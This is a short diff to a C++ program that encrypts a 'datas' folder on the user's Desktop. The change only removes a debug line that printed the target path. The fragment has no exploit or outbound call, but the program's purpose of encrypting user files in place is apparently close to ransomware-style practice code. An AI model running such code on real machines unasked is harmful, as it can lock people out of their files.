@@ -16,7 +16,6 @@ int main() {
   std::string pathSeparator = platformGreeting.getPathSeparator();
   std::string encryptionDirectory = homeDirectory + pathSeparator + "Desktop" +
                                     pathSeparator + "datas" + pathSeparator;
-  std::cout << encryptionDirectory;
   // Encrypt the directory
   directoryEncryptor.encrypt(encryptionDirectory);
 
